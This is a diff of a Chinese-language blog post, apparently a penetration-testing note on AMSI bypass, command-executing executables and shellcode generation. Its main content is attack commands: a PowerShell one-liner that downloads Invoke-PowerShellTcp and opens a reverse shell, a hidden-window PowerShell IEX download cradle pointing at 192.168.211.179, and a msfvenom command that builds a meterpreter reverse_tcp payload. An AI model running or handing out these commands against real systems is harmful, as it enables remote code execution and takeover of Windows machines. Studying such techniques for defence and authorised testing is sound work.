@@ -17,7 +17,7 @@ tags:
 
 关于amsi的文章参考：
 
-https://xz.aliyun.com/t/3095
+<https://xz.aliyun.com/t/3095>
 
 这里的文件编译号生成为dll文件
 
@@ -37,9 +37,21 @@ https://xz.aliyun.com/t/3095
 
 生成一个一个直接执行命令的exe
 
-①powershell iex (New-Object Net.WebClient).DownloadString('http://InvokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] 
+①
 
-②powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.211.179:80/a'))" 
+```powershell
+powershell iex (New-Object Net.WebClient).DownloadString('http://InvokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] 
+```
+
+
+
+②
+
+```powershell
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.211.179:80/a'))" 
+```
+
+
 
 但是如何修改代码生成可执行命令的exe和脚本，还没弄懂  有时间大佬可以研究研究
 
@@ -59,7 +71,13 @@ https://xz.aliyun.com/t/3095
 
 生成shellcode
 kali ip： 192.168.0.107
+
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=9999 -f raw  > /opt/shellcode
+```
+
+
+
 ![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvz10mtj20iv0jv40n.jpg)
 DKMC生成shellcode
 ![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehw5aawkj20j00jp76v.jpg)
